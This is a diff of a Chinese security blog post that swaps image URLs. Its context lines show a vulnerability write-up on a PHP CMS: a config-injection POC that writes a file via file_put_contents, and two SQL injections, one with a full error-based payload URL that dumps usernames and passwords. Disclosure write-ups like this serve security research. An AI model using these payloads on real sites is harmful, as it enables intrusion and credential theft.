@@ -87,7 +87,7 @@ $db[<span style="color:#e6db74">&#39;default&#39;</span>]  <span style="color:#f
   <span style="color:#e6db74">&#39;failover&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(),
 );
 </code></pre></div><p>安装界面：
-<img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x00.jpg" alt="Install"></p>
+<img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e3529386-4f5e-11ec-a703-00d861bf4abb.jpg" alt="Install"></p>
 <p>然后找到这个界面对应的代码 <code>diy\dayrui\controllers\Install.php</code>：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#e6db74">/**
@@ -336,15 +336,15 @@ $db[<span style="color:#e6db74">&#39;default&#39;</span>]  <span style="color:#f
 
 </code></pre></div><p>然后定位到<code>$data['dbprefix']</code>是可控的，也就是数据库的表前缀，前面的数据库配置文件内容以及交代清楚，接下来构造一个POC：
 <code>','x'=&gt;file_put_contents('s.txt','ss'),'b'=&gt;'b</code></p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x01.jpg" alt="POC"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e3a04450-4f5e-11ec-acd7-00d861bf4abb.jpg" alt="POC"></p>
 <p>这个POC是在数组中的，会在网站根目录新建一个<code>s.txt</code>内容为<code>ss</code>，在PHP的数组里，你可以放eval等字符，但是这个<code>database.php</code>是不能直接访问的，因为<code>if (!defined('BASEPATH')) exit('No direct script access allowed');</code>这一句是判断是否是框架初始化后加载此文件，否则就不再继续向下运行，好像这种思路都是框架常用的办法。</p>
 <h2 id="0x02-后台sql注入">0x02 后台SQL注入</h2>
 <p>第二处是在后台的某处搜索上，这个Input是一个日期输入框，但是不是原生的Input。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x02.jpg" alt="DATE"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e3ea4df2-4f5e-11ec-b551-00d861bf4abb.jpg" alt="DATE"></p>
 <p>我们抓包看看请求：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x03.jpg" alt="Request"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e442cfea-4f5e-11ec-ac86-00d861bf4abb.jpg" alt="Request"></p>
 <p>控制器文件位于：<code>diy\module\member\controllers\admin\Home.php</code></p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x04.jpg" alt="Controller"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e48b9928-4f5e-11ec-8954-00d861bf4abb.jpg" alt="Controller"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#e6db74">/**
 </span><span style="color:#e6db74">     * 经验值
@@ -409,7 +409,7 @@ $db[<span style="color:#e6db74">&#39;default&#39;</span>]  <span style="color:#f
     <span style="color:#66d9ef">return</span> $_param;
   }
 </code></pre></div><p>故此出现了一个注入点：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x05.jpg" alt="SQL Injection"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e4d0fd1a-4f5e-11ec-89c6-00d861bf4abb.jpg" alt="SQL Injection"></p>
 <h2 id="0x03-前台sql注入">0x03 前台SQL注入</h2>
 <p>文件位置：<code>diy\module\member\controllers\Account.php</code>，约：757行左右，出现一处变量未过滤的情况。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
@@ -482,8 +482,8 @@ $db[<span style="color:#e6db74">&#39;default&#39;</span>]  <span style="color:#f
 }
 </code></pre></div><p>可见调用这个方法还是有用的，但是在官方代码中，<code>module</code>并没有过滤。</p>
 <p>于是根据数据库结构构造EXP……</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x07.jpg" alt="POC"></p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x06.jpg" alt="POC"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e51ca6e8-4f5e-11ec-8327-00d861bf4abb.jpg" alt="POC"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e56c850a-4f5e-11ec-9e88-00d861bf4abb.jpg" alt="POC"></p>
 <p><code>index.php?s=member&amp;c=account&amp;m=attachment&amp;module=&amp;ext=pa&amp;module=d%&quot; and(select 1 from(select count(*),concat((select (select (SELECT distinct concat('[',username,0x3a,password,'] by Coralab') FROM dr_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- x</code></p>
 <p>是不是看的很舒服？ 哈哈，这个基于框架的CMS漏洞还是很多的，抽空继续看，下班了、</p>
 <h2 id="0x04-总结">0x04 总结</h2>
